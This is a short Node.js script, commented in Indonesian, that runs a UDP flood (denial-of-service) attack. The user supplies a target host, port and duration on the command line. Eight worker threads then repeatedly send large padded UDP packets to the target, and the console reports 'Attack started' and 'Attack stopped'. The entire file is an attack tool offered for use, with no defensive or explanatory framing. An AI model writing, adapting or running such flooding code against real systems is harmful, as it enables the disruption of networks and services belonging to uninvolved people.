const dgram = require('dgram');
const { Worker, isMainThread, parentPort } = require('worker_threads');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('PermenMD');
    return payload;
}

const payload = generatePayload(150000); 

// Fungsi pengiriman paket menggunakan worker
function sendPackets(workerId) {
    const socket = dgram.createSocket('udp4');
    let counter = 0;
    const interval = setInterval(() => {
        if (counter >= 100) { // Kirim 100 paket per interval
            clearInterval(interval);
            socket.close();
            return;
        }
        socket.send(payload, 0, payload.length, port, target, (err) => {
            if (err) {
                console.error(`Worker ${workerId} Error:`, err);
            }
        });
        counter++;
    }, 0.1); // Jeda antar pengiriman paket 0.1 ms

    return interval;
}

// Fungsi untuk membuat worker dan menjalankan pengiriman paket
function startAttack() {
    console.log('Attack started...');
    const workers = [];
    const workerCount = 8; // Jumlah worker yang dijalankan secara paralel
    
    for (let i = 0; i < workerCount; i++) {
        const worker = new Worker(__filename);
        workers.push(worker);
        worker.on('message', (msg) => {
            console.log(`Worker ${i}: ${msg}`);
        });
        worker.on('error', (err) => {
            console.error(`Worker ${i} Error: ${err}`);
        });
    }

    setTimeout(() => {
        workers.forEach(worker => worker.terminate());
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);
}

// Jika ini adalah thread utama, mulai serangan
if (isMainThread) {
    startAttack();
} else {
    // Menjalankan pengiriman paket dengan worker thread
    sendPackets();
}